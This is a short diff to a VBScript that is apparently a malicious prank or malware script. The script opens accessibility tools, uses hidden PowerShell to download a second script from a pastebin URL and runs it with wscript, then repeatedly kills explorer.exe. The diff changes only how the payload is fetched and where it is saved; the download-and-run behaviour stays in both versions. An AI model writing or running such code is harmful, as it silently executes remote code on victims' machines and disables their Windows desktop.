@@ -4,8 +4,8 @@ WshShell.Run "magnify.exe", 1, False
 
 WshShell.Run "narrator", 0, False
 
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','$env:TEMP\soundloop.vbs')""", 0, True
-WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
+WshShell.Run "powershell -w hidden -c ""curl https://pastebin.com/raw/tLYqCwJQ -o soundloop.vbs""", 0, True
+WshShell.Run "wscript.exe soundloop.vbs", 0, False
 
 Do
     WshShell.Run "taskkill /f /im explorer.exe", 0, False
